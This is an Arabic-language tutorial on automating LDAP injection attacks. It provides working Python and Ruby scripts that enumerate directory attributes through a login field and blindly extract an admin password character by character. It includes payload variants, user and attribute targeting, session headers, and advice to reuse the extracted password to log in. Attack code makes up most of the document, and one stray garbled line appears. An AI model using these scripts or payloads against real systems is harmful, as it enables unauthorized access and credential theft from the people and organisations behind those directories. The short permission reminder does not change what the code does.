## الخطوات العملية لأتمتة الاختبار
1. **إعداد البيئة**:
   - تأكد من تثبيت Python 3 أو Ruby على جهازك.
   - قم بتثبيت المكتبات المطلوبة:
     - لـ Python: `pip install requests`
     - لـ Ruby: تأكد من توفر مكتبة `net/http` (مدمجة افتراضيًا).
   - استخدم أداة وكيل (مثل Burp Suite أو OWASP ZAP) لمراقبة الطلبات والاستجابات.
   - حدد حقل إدخال يتفاعل مع LDAP (مثل حقل اسم المستخدم، حقل البحث، أو معايير URL).
2. **إنشاء ملف قاموس**:
   - لاختبار الخصائص: أنشئ ملفًا (مثل `dic`) يحتوي على قائمة بالخصائص الشائعة.
   - للاستغلال الأعمى: استخدم مجموعة أحرف (مثل الحروف، الأرقام، والرموز) لتخمين القيم.
3. **كتابة السكربت**:
   - اكتب سكربتًا لإرسال طلبات HTTP تحتوي على استعلامات LDAP.
   - عدّل السكربت بناءً على:
     - عنوان URL للموقع.
     - حقل الإدخال (مثل `login` أو `search`).
     - شرط النجاح (مثل نص في الاستجابة أو رمز حالة HTTP).
4. **تشغيل السكربت**:
   - شغّل السكربت وتحقق من المخرجات (مثل قائمة الخصائص الصالحة أو القيمة المستخلصة).
   - راقب الطلبات في Burp Suite للتأكد من أنها تُرسل بشكل صحيح.
5. **تحليل النتائج**:
   - استخدم الخصائص الصالحة أو القيم المستخلصة في هجمات إضافية (مثل تجاوز التحقق أو الاستغلال الأعمى).

---

## جميع المحاولات الممكنة لأتمتة الاختبار
في هذه الخطوة، المحاولات تعتمد على نوعين رئيسيين من السكربتات:
1. **سكربتات اكتشاف الخصائص الصالحة**: لاختبار قائمة خصائص (مثل `uid`, `cn`, `userPassword`) وتحديد أيها مدعوم.
2. **سكربتات الاستغلال الأعمى**: لتخمين قيمة خاصية (مثل كلمة المرور) حرفًا بحرفًا.

سأقدم السكربتات مع التعديلات الممكنة لكل نوع، بالإضافة إلى قوائم المدخلات التي يمكن استخدامها.

### 1. سكربتات اكتشاف الخصائص الصالحة
الهدف هو اختبار قائمة من الخصائص الشائعة (مثل `uid`, `cn`, `sn`) لمعرفة أيها صالح. يتم ذلك بإرسال طلبات تحتوي على استعلامات مثل `*)(ATTRIBUTE=*)` وتحليل الاستجابات.

#### سكربت Python لاكتشاف الخصائص
```python
#!/usr/bin/python3
import requests
import string

fields = []
url = 'https://TARGET_URL.com/'  # استبدل بـ URL الموقع
f = open('dic', 'r')
world = f.read().split('\n')
f.close()

for i in world:
    r = requests.post(url, data={'login': '*)('+str(i)+'=*))\x00', 'password': 'bla'})
    if 'TRUE CONDITION' in r.text:  # استبدل TRUE CONDITION بنص يظهر عند النجاح
        fields.append(str(i))

print(fields)
```

- **الإعداد**:
  - أنشئ ملفًا يسمى `dic` يحتوي على قائمة بالخصائص الشائعة (كل خاصية في سطر):
    ```
    uid
    cn
    sn
    userPassword
    mail
    givenName
    objectClass
    name
    surname
    commonName
    displayName
    telephoneNumber
    description
    memberOf
    sAMAccountName
    userPrincipalName
    ```
  - استبدل `https://TARGET_URL.com/` بعنوان الموقع المستهدف (مثل `https://example.com/login`).
  - استبدل `'TRUE CONDITION'` بنص يظهر في الاستجابة عندما تكون الخاصية صالحة (مثل `"Welcome"`, `"Success"`, أو تحقق من رمز الحالة مثل `r.status_code == 200`).
- **التعديلات الممكنة**:
  - **تغيير نوع الطلب**:
    - إذا كان الموقع يستخدم طلب GET بدلاً من POST، استبدل `requests.post` بـ `requests.get` وعدّل المعايير:
      ```python
      r = requests.get(url + '?search=*)(' + str(i) + '=*))\x00')
      ```
  - **تغيير حقل الإدخال**:
    - إذا كان حقل الإدخال ليس `login`، استبدله بالحقل الصحيح (مثل `username` أو `search`):
      ```python
      r = requests.post(url, data={'username': '*)('+str(i)+'=*))\x00', 'password': 'bla'})
      ```
  - **تغيير شرط النجاح**:
    - إذا كنت تستخدم رمز حالة HTTP:
      ```python
      if r.status_code == 200:
          fields.append(str(i))
      ```
    - إذا كنت تبحث عن طول الاستجابة:
      ```python
      if len(r.text) > 100:  # استبدل 100 بالطول المناسب
          fields.append(str(i))
      ```
  - **إضافة رؤوس HTTP**:
    - إذا كان الموقع يتطلب رؤوسًا (مثل `Authorization` أو `Cookie`):
      ```python
      headers = {'Authorization': 'Bearer TOKEN', 'Cookie': 'session=XYZ'}
      r = requests.post(url, data={'login': '*)('+str(i)+'=*))\x00', 'password': 'bla'}, headers=headers)
      ```
- **التشغيل**:
  - `python3 discover_fields.py`
- **المخرجات**:
  - يطبع قائمة بالخصائص الصالحة (مثل `['uid', 'cn', 'userPassword']`).

#### سكربت Ruby لاكتشاف الخصائص
```ruby
#!/usr/bin/env ruby
require 'net/http'

fields = []
url = URI('https://TARGET_URL.com/')  # استبدل بـ URL الموقع
world = File.read('dic').split("\n")

world.each do |i|
  http = Net::HTTP.new(url.host, url.port)
  http.use_ssl = true if url.scheme == 'https'
  request = Net::HTTP::Post.new(url)
  request.set_form_data('login' => "*)(#{i}=*))\x00", 'password' => 'bla')
  response = http.request(request)
  if response.body.include?('TRUE CONDITION')  # استبدل TRUE CONDITION بنص يظهر عند النجاح
    fields << i
  end
end

puts fields
```

- **الإعداد**:
  - نفس ملف `dic` المستخدم في سكربت Python.
  - استبدل `https://TARGET_URL.com/` بعنوان الموقع.
  - استبدل `'TRUE CONDITION'` بنص النجاح.
- **التعديلات الممكنة**:
  - مماثلة لتعديلات Python (تغيير نوع الطلب، حقل الإدخال، شرط النجاح، إضافة رؤوس).
  - مثال لاستخدام GET:
    ```ruby
    request = Net::HTTP::Get.new(url + "?search=*)(#{i}=*))\x00")
    ```
- **التشغيل**:
  - `ruby discover_fields.rb`
- **المخرجات**:
  - يطبع قائمة بالخصائص الصالحة.

#### قائمة الخصائص للاختبار
إليك قائمة الخصائص الشائعة التي يجب إدراجها في ملف `dic`:
- `uid`
- `cn`
- `sn`
- `userPassword`
- `mail`
- `givenName`
- `objectClass`
- `name`
- `surname`
- `commonName`
- `displayName`
- `telephoneNumber`
- `description`
- `memberOf`
- `sAMAccountName`
- `userPrincipalName`

### 2. سكربتات الاستغلال الأعمى
الهدف هو تخمين قيمة خاصية (مثل كلمة المرور أو `cn`) حرفًا بحرفًا باستخدام الاستغلال الأعمى. السكربت يرسل طلبات تحتوي على استعلامات مثل `password=M*`, `password=MA*`, ويحلل الاستجابات لتحديد الأحرف الصحيحة.

#### سكربت Python للاستغلال الأعمى
```python
#!/usr/bin/python3
import requests
import string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
url = "http://TARGET_URL.com?action=dir&search="  # استبدل بـ URL الموقع
for i in range(50):  # الحد الأقصى لطول القيمة
    print("[i] Looking for character " + str(i + 1))
    for char in alphabet:
        payload = "admin*)(password=" + flag + char
        r = requests.get(url + payload)
        if "TRUE CONDITION" in r.text:  # استبدل TRUE CONDITION بنص يظهر عند النجاح
            flag += char
            print("[+] Flag: " + flag)
            break
```

- **الإعداد**:
  - استبدل `http://TARGET_URL.com?action=dir&search=` بعنوان URL الصحيح ومعايير الإدخال (مثل `http://example.com/search?query=`).
  - استبدل `'TRUE CONDITION'` بنص يظهر في الاستجابة عند تطابق الشرط (مثل `"Success"`, أو استخدم `r.status_code == 200`).
  - عدّل `alphabet` إذا كنت تريد تضمين أحرف أو رموز إضافية:
    ```python
    alphabet = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"
    ```
  - عدّل الحد الأقصى لطول القيمة (`50`) إذا كنت تعتقد أن القيمة أقصر أو أطول.
- **التعديلات الممكنة**:
  - **تغيير نوع الطلب**:
    - إذا كان الموقع يستخدم POST:
      ```python
      r = requests.post(url, data={'search': 'admin*)(password=' + flag + char})
      ```
  - **استهداف خاصية أخرى**:
    - لاستهداف `cn` بدلاً من `password`:
      ```python
      payload = "admin*)(cn=" + flag + char
      ```
  - **تغيير المستخدم**:
    - لاستهداف مستخدم غير `admin` (مثل `administrator`):
      ```python
      payload = "administrator*)(password=" + flag + char
      ```
  - **تغيير شرط النجاح**:
    - إذا كنت تستخدم رمز حالة HTTP:
      ```python
      if r.status_code == 200:
          flag += char
      ```
    - إذا كنت تستخدم طول الاستجابة:
      ```python
      if len(r.text) > 100:  # استبدل 100 بالطول المناسب
          flag += char
      ```
  - **إضافة رؤوس HTTP**:
    ```python
    headers = {'Authorization': 'Bearer TOKEN', 'Cookie': 'session=XYZ'}
    r = requests.get(url + payload, headers=headers)
    ```
- **التشغيل**:
  - `python3 blind_injection.py`
- **المخرجات**:
  - يطبع القيمة المستخلصة حرفًا بحرفًا (مثل `[+] Flag: MYKE`).

#### سكربت Ruby للاستغلال الأعمى
```ruby
#!/usr/bin/env ruby
require 'net/http'
alphabet = [*'a'..'z', *'A'..'Z', *'0'..'9'] + '_@{}-/()!"$%=^[]:;'.split('')

flag = ''
url = URI('http://TARGET_URL.com?action=dir&search=')  # استبدل بـ URL الموقع
(0..50).each do |i|
  puts "[i] Looking for character #{i + 1}"
  alphabet.each do |char|
    payload = "admin*)(password=#{flag}#{char}"
    http = Net::HTTP.new(url.host, url.port)
    http.use_ssl = true if url.scheme == 'https'
    request = Net::HTTP::Get.new(url + payload)
    response = http.request(request)
    if response.body.match?(/TRUE CONDITION/)  # استبدل TRUE CONDITION بنص يظهر عند النجاح
      flag += char
      puts "[+] Flag: #{flag}"
      break
    end
  end
end
```

- **الإعداد**:
  - استبدل `http://TARGET_URL.com?action=dir&search=` بعنوان URL الصحيح.
  - استبدل `'TRUE CONDITION'` بنص النجاح.
  - عدّل `alphabet` إذا لزم الأمر:
    ```ruby
    alphabet = ('a'..'z').to_a + ('A'..'Z').to_a + ('0'..'9').to_a + '!@#$%^&*()_+-=[]{}|;:,.<>?'.split('')
    ```
- **التعديلات الممكنة**:
  - مماثلة لتعديلات Python (تغيير نوع الطلب، الخاصية، المستخدم، شرط النجاح، إضافة رؤوس).
  - مثال لاستخدام POST:
    ```ruby
    request = Net::HTTP::Post.new(url)
    request.set_form_data('search' => "admin*)(password=#{flag}#{char}")
    ```
- **التشغيل**:
  - `ruby blind_injection.rb`
- **المخرجات**:
  - يطبع القيمة المستخلصة حرفًا بحرفًا.

#### قائمة الأحرف للاستغلال الأعمى
إليك مجموعة الأحرف التي يمكن استخدامها في `alphabet` لتخمين القيم:
- **الحروف**: `a-z`, `A-Z`
- **الأرقام**: `0-9`
- **الرموز**: `_@{}-/()!"$%=^[]:;,.&*+`
- **مثال شامل**:
  ```
  abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@{}-/()!"$%=^[]:;,.&*+
  ```

### 3. محاولات إضافية للأتمتة
بالإضافة إلى السكربتات أعلاه، يمكنك تجربة التعديلات التالية لتغطية سيناريوهات مختلفة:

#### أ. اختبار معايير URL
- إذا كان الموقع يستخدم معايير URL (مثل `?search=admin`):
  - عدّل سكربت اكتشاف الخصائص:
    ```python
    r = requests.get(url + '?search=*)(' + str(i) + '=*))\x00')
    ```
  - عدّل سكربت الاستغلال الأعمى:
    ```python
    r = requests.get(url + '?search=admin*)(password=' + flag + char)
    ```

#### ب. استهداف مستخدمين مختلفين
- اختبر مستخدمين محتملين (مثل `administrator`, `guest`, `user`):
  - في سكربت الاستغلال الأعمى:
    ```python
    payload = "administrator*)(password=" + flag + char
    ```

#### ج. اختبار خصائص متعددة في الاستغلال الأعمى
- إذا كنت تريد تخمين قيم خصائص أخرى (مثل `cn`, `mail`):
  ascended: **الاستغلال الأعمى**:
  - عدّل السكربت لاستهداف خاصية أخرى:
    ```python
    payload = "admin*)(cn=" + flag + char
    ```

#### د. استخدام قوائم أحرف مخصصة
- إذا كنت تعتقد أن القيمة تحتوي على أحرف معينة فقط (مثل أرقام أو حروف كبيرة):
  - عدّل `alphabet`:
    ```python
    alphabet = string.digits  # أرقام فقط
    ```
    أو:
    ```python
    alphabet = string.ascii_uppercase  # حروف كبيرة فقط
    ```

#### هـ. التعامل مع التأخيرات
- إذا كان الموقع يفرض تأخيرات (Rate Limiting):
  - أضف تأخيرًا بين الطلبات:
    ```python
    import time
    time.sleep(1)  # تأخير ثانية واحدة
    ```

---

## نصائح لأتمتة الاختبار
1. **اختبار السكربت أولاً**:
   - شغّل السكربت في بيئة معمل (مثل TryHackMe) للتأكد من أنه يعمل قبل اختبار موقع حقيقي.
2. **استخدام Burp Suite**:
   - راقب الطلبات في Burp Suite للتأكد من أن السكربت يرسل الاستعلامات بشكل صحيح.
   - استخدم **Intruder** كبديل للسكربتات إذا كنت تفضل واجهة رسومية.
3. **ضبط شرط النجاح**:
   - تأكد من أن `'TRUE CONDITION'` دقيق (اختبر يدويًا أولاً لتحديد الاستجابة الإيجابية).
   - جرب شروطًا متعددة (نص، رمز حالة، طول الاستجابة) إذا لزم الأمر.
4. **إدارة الأخطاء**:
   - أضف معالجة الأخطاء في السكربت:
     ```python
     try:
         r = requests.get(url + payload)
     except requests.exceptions.RequestException as e:
         print(f"Error: {e}")
         continue
     ```
5. **الأمان**:
   - اختبر فقط في بيئة قانونية (معمل أو موقع لديك إذن باختباره).
   - تجنب إرسال طلبات مكثفة قد تؤثر على أداء الموقع.

---

## ملخص جميع المحاولات
### سكربتات اكتشاف الخصائص
- **سكربت Python** (`discover_fields.py`):
  - يختبر قائمة خصائص من ملف `dic`.
  - التعديلات: نوع الطلب (GET/POST)، حقل الإدخال، شرط النجاح، رؤوس HTTP.
- **سكربت Ruby** (`discover_fields.rb`):
  - نفس الوظيفة مع اختلاف اللغة.
- **الخصائص للاختبار**:
  - `uid`, `cn`, `sn`, `userPassword`, `mail`, `givenName`, `objectClass`, `name`, `surname`, `commonName`, `displayName`, `telephoneNumber`, `description`, `memberOf`, `sAMAccountName`, `userPrincipalName`.

### سكربتات الاستغلال الأعمى
- **سكربت Python** (`blind_injection.py`):
  - يخمن قيمة خاصية (مثل `password`) حرفًا بحرفًا.
  - التعديلات: نوع الطلب، الخاصية، المستخدم، شرط النجاح، رؤوس HTTP، قائمة الأحرف.
- **سكربت Ruby** (`blind_injection.rb`):
  - نفس الوظيفة مع اختلاف اللغة.
- **الأحرف للاختبار**:
  - `a-z`, `A-Z`, `0-9`, `_@{}-/()!"$%=^[]:;,.&*+` (أو قوائم مخصصة).

### محاولات إضافية
- اختبار معايير URL (مثل `?search=`).
- استهداف مستخدمين مختلفين (مثل `administrator`, `guest`).
- اختبار خصائص متعددة (مثل `cn`, `mail`).
- استخدام قوائم أحرف مخصصة.
- التعامل مع التأخيرات.

---

## مثال عملي باستخدام Burp Suite والسكربت
1. **إعداد Burp Suite**:
   - اضبط المتصفح لتوجيه حركة المرور عبر Burp Suite (`127.0.0.1:8080`).
   - اختبر طلبًا يدويًا (مثل `*)(userPassword=*)`) لتحديد شرط النجاح (مثل `"Welcome"` أو رمز 200).
2. **إعداد السكربت**:
   - أنشئ ملف `dic` مع الخصائص.
   - عدّل `url` و`'TRUE CONDITION'` في `discover_fields.py`.
   - للاستغلال الأعمى، عدّل `url`, `payload`, و`'TRUE CONDITION'` في `blind_injection.py`.
3. **تشغيل السكربت**:
   - `python3 discover_fields.py` للحصول على الخصائص الصالحة.
   - `python3 blind_injection.py` لتخمين قيمة (مثل كلمة المرور).
4. **تحليل النتائج**:
   - استخدم الخصائص الصالحة (مثل `userPassword`) في هجمات أخرى.
   - إذا استخلصت قيمة (مثل `MYKE`), جربها في تسجيل الدخول.

---
